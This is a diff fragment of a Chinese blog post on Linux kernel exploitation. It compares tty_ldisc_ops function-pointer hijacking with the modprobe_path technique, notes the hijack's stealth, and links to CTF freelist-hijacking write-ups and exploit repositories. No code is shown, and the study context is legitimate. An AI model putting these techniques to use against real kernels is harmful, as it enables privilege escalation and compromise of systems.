+本章技术是前三章内存控制技术的自然延伸和深化。从单纯的内存数据控制发展到控制流程引导，体现技术链的完整性和渐进性。两者共享相同的内存操作基础，但目标和技术复杂度不同。内存控制技术侧重于数据状态的修改和控制，而控制流程引导技术侧重于执行路径的重定向和优化。
+
+**关键技术差异**：
+
+1. **控制粒度**：函数指针劫持提供更精细的控制粒度，能直接引导控制流程
+2. **触发时机**：系统调用触发相比文件执行触发具有更高的即时性
+3. **环境要求**：完全内核空间操作减少对外部组件的依赖
+4. **恢复难度**：函数指针劫持技术更容易实现状态恢复，系统影响更小
+
+### 5-9. 技术总结
+
+`tty_ldisc_ops`结构控制流程引导技术代表内核控制流程引导技术的高级阶段。与`modprobe_path`技术相比，此技术提供更高的控制精度和更强的隐蔽性。通过精心设计的寄存器状态控制和栈指针转移，实现完全在内核空间完成的控制流程引导操作。从技术演进角度看，本章技术是前三章技术的自然延伸和深化，体现内核控制流程引导技术从简单到复杂、从间接到直接的发展路径。
+
+### 5-10. 测试结果
+
+<div style="text-align: center; margin: 2rem 0;">
+  <img src="/images/posts/KernelExploit/FreelistHijacking/FreelistHijacking_002.png"
+       style="border-radius: 12px; 
+              box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+              max-width: 100%;
+              height: auto;">
+</div>
+
 ## 参考
 
 https://github.com/BinRacer/pwn4kernel/tree/master/src/ArbitraryAddrAlloc
+https://github.com/BinRacer/pwn4kernel/tree/master/src/ArbitraryAddrAlloc3
 https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#例题：RWCTF2022高校赛-Digging-into-kernel-1-2
+https://ltfa1l.top/2024/08/01/system/kernel/Linux_kernel4_freelist劫持/#0x03-初探freelist劫持：以RWCTF2022体验赛-Digging-into-kernel2为例
